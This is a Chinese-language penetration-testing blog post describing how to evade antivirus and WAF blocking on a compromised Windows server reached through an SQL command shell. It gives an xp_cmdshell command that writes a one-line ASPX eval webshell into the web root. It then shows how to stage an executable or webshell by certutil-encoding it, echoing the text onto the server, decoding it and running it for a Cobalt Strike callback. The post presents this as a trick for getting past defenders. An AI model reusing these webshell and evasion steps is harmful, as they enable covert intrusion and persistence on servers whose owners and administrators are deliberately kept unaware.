各位在渗透中是否遇见过这个问题：

虽然有低权限命令shell，如mssql、postgres等，执行下载总是各种无权限或者被AV杀，轻则无法继续渗透，重则弹出拦截消息，管理员上机后立马发现。

本文将介绍一种使用windows自带工具进行编码，写入编码数据到TXT文本最后再解码的骚操作。

话不多说，例如这样场景：在数据库连接后或者sqlmap注入连接os-shell后可执行命令：

![](https://image.3001.net/images/20210103/1609682033_5ff1cc71b8cb9c80e410c.png!small)

其中包括杀软或某狗、某盾：

![](https://image.3001.net/images/20210103/1609682128_5ff1ccd07959eb92dbdf7.png!small)

此时下载文件的各种命令均被拦截：

![](https://image.3001.net/images/20210103/1609682148_5ff1cce49bc4a953b2031.png!small)

bitsadmin：

![](https://image.3001.net/images/20210103/1609682155_5ff1ccebd183f8a7fa5b3.png!small)

certutil证书：

![](https://image.3001.net/images/20210103/1609682164_5ff1ccf49b3c970616e9d.png!small)

还会被杀软报警：

![](https://image.3001.net/images/20210103/1609682172_5ff1ccfc9f82e9994b446.png!small)

powershell也会被彻底封杀：

![](https://image.3001.net/images/20210103/1609682180_5ff1cd041bceb552318f0.png!small)

尤其是某管家，拦截更彻底，根本没有倒计时自动消失（此时需要夸一下某大厂的报警提示倒计时功能）

而在这种环境下可在有权限写入的前提下尝试写入一句话木马：

    
    
    xp_cmdshell 'echo  ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["bmfx"], "unsafe");%^>> D:\\WWW\\bmfx.aspx'

但也存在被某狗、WAF杀掉的可能。

此时，骚操作上场。

windows自带的证书下载，也就是上文使用但远程下载被拦截的Certutil，还可用来对文件编码解码：

    
    
    本地：
    Certutil -encode artifact.txt artifact.exe
    
    或指定路径：
    Certutil -encode d:\artifact.txt d:\artifact.exe

![](https://image.3001.net/images/20210103/1609682188_5ff1cd0c1b3d546bf88ac.png!small)

将txt文本使用echo命令：

    
    
    echo sfAFASFAsfasgasdf………>>d:\1.txt

写入服务器后，进入txt所在目录执行解码（或直接指定物理目录文件）：

    
    
    Certutil -decode art.txt art.exe
    或：
    Certutil -decode d:\art.txt d:\art.exe

![](https://image.3001.net/images/20210103/1609682197_5ff1cd15c0b7f8cf1f9c0.png!small)

后续可在命令中执行exe上线：

    
    
    cmd.exe /c art.exe

重点是：本地解码编码操作不会触发杀软拦截行为！

此外，Certutil支持将任意文件编码解码，除了exe还有aspx、php、jsp等（如加密免杀的webshell，此处使用哥斯拉为例）：

![](https://image.3001.net/images/20210103/1609682205_5ff1cd1df28863b8bbac7.png!small)

可在web站点写入文件后访问txt查看写入有无偏差：

![](https://image.3001.net/images/20210103/1609682327_5ff1cd97306729b0ab754.png!small)

还有一点，本人亲测，编码后txt中的文本类似于生成的shellcode，会自动换行显示，但本地替换换行符、自行拆分换行符，不改变内容的前提下，编码、解码前后的文件不会有任何影响。

但是在navicat等数据库软件里操作的话还有一个限制，echo的长度会提示不要过长：

![](https://image.3001.net/images/20210103/1609682335_5ff1cd9f2e29e83bb4d0b.png!small)

此时就要看各位师傅们在bypass WaF、AV时如何减小体量了，一般cs的马bypass后会在50k左右，使用sqlmap的—os-shell执行echo不会像navicat要求128字符那么短，但也有长度限制，具体各位可亲测。

